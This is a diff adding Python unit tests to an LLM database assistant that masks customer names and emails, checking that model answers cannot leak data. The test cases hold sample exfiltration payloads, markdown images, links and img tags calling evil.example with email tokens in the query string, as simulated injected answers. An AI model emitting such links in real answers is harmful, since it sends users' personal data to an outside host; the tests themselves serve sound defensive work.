@@ -13,7 +13,7 @@ from src.agent.graph import Assistant
 from src.agent.prompts import build_messages
 from src.config import Settings
 from src.observability import Tracer
-from src.privacy import PROMPT_NOTE, Pseudonymizer, load_pseudonymizer
+from src.privacy import PROMPT_NOTE, Pseudonymizer, load_pseudonymizer, strip_external
 from tests.unit.test_agent import FakeLLM, answer, query
 
 PEOPLE = Pseudonymizer.from_rows(
@@ -148,3 +148,47 @@ def test_history_is_masked(settings: Settings) -> None:
     assert turn.answer == "É [email_1]." and turn.status == "answered"
     assert nome not in llm.prompts[-1] and email not in llm.prompts[-1]
     assert "Pergunta: Qual o e-mail de [nome_1]?" in llm.prompts[-1]
+
+
+# ------------------------------------------- exfiltration through the answer (feedback 2026-11-14, 2.1)
+
+
+def test_unmask_only_replaces_allowed_tokens() -> None:
+    text = "[nome_1] e [email_2]"
+    assert PEOPLE.unmask(text, allowed={"[nome_1]"}) == "Ana Lima e [email_2]"
+    assert PEOPLE.tokens_in("[nome_1], [email_2] e [nome_1]") == {"[nome_1]", "[email_2]"}
+
+
+@pytest.mark.parametrize(
+    ("text", "expected"),
+    [
+        ("Total: 17 ![.](https://evil.example/p.png?d=[email_1])", "Total: 17"),
+        ("Veja ![x][ref]\n\n[ref]: https://evil.example/p.png", "Veja"),
+        ("Detalhes [aqui](https://evil.example/?d=[email_1]).", "Detalhes aqui."),
+        ("Fonte: https://evil.example/?d=1 ok", "Fonte: [link removido] ok"),
+        ('<img src="https://evil.example/p.png"> fim', "fim"),
+        ("Sem nada externo: 17 clientes.", "Sem nada externo: 17 clientes."),
+    ],
+)
+def test_strip_external_content(text: str, expected: str) -> None:
+    assert strip_external(text) == expected
+
+
+def test_answer_cannot_exfiltrate_unseen_emails(settings: Settings, db_path: Path) -> None:
+    with closing(sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)) as con:
+        emails = [str(r[0]) for r in con.execute("SELECT email FROM clientes ORDER BY rowid LIMIT 3")]
+    sql = "SELECT COUNT(*) AS total FROM clientes"
+    injected = "100 clientes. ![.](https://evil.example/p.png?d=[email_1]|[email_2]|[email_3])"
+    llm = FakeLLM([query(sql), answer(sql, injected)])
+    response = Assistant(llm, settings).ask("Quantos clientes existem?")
+    assert "evil.example" not in response.answer
+    assert not any(e in response.answer for e in emails)
+    assert response.answer.startswith("100 clientes.")
+
+
+def test_tokens_from_the_turn_results_are_still_unmasked(settings: Settings) -> None:
+    nome, email = first_client(settings.db_path)
+    sql = "SELECT nome, email FROM clientes ORDER BY rowid LIMIT 1"
+    llm = FakeLLM([query(sql), answer(sql, "É [nome_1] ([email_1]); [email_2] não apareceu.")])
+    response = Assistant(llm, settings).ask("Quem é o primeiro cliente?")
+    assert response.answer == f"É {nome} ({email}); [email_2] não apareceu."
